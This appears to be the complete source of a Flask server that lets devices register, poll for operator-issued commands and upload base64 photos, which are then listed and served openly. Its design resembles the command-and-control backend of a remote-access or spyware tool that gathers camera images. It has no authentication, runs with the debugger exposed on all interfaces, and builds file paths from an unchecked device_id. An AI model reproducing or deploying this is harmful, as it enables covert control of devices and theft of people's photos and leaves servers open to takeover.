from flask import Flask, request, jsonify, send_from_directory
from datetime import datetime
import os
import base64

app = Flask(__name__)

# In-memory store
devices = {}

# Folder to store images
UPLOAD_DIR = "uploaded_photos"
os.makedirs(UPLOAD_DIR, exist_ok=True)

@app.route("/register", methods=["POST"])
def register():
    data = request.get_json()
    device_id = data.get("device_id")
    if not device_id:
        return jsonify({"error": "No device_id"}), 400

    data["last_seen"] = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
    devices[device_id] = data
    return jsonify({"message": "Registered"}), 200

@app.route("/devices", methods=["GET"])
def list_devices():
    return jsonify(list(devices.values())), 200

@app.route("/command", methods=["POST"])
def send_command():
    data = request.get_json()
    device_id = data.get("device_id")
    command = data.get("command")

    if device_id in devices:
        devices[device_id]["pending_command"] = command
        return jsonify({"message": "Command sent"}), 200
    return jsonify({"error": "Device not found"}), 404

@app.route("/poll/<device_id>", methods=["GET"])
def poll(device_id):
    device = devices.get(device_id)
    if not device:
        return jsonify({"error": "Device not registered"}), 404

    command = device.pop("pending_command", None)
    return jsonify({"command": command}), 200

@app.route("/upload_photo", methods=["POST"])
def upload_photo():
    data = request.get_json()
    device_id = data.get("device_id")
    image_b64 = data.get("image")

    if not device_id or not image_b64:
        return jsonify({"error": "Missing device_id or image"}), 400

    try:
        image_data = base64.b64decode(image_b64)
        filename = f"{device_id}_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.jpg"
        filepath = os.path.join(UPLOAD_DIR, filename)

        with open(filepath, "wb") as f:
            f.write(image_data)

        print(f"✅ Image saved to: {filepath}")
        return jsonify({"message": "Image received", "file": filename}), 200
    except Exception as e:
        print("❌ Failed to save image:", e)
        return jsonify({"error": "Failed to decode image"}), 500

@app.route("/photos/<filename>")
def get_photo(filename):
    return send_from_directory(UPLOAD_DIR, filename)

@app.route("/photos", methods=["GET"])
def list_photos():
    files = os.listdir(UPLOAD_DIR)
    return jsonify(files)
    
if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=5000)
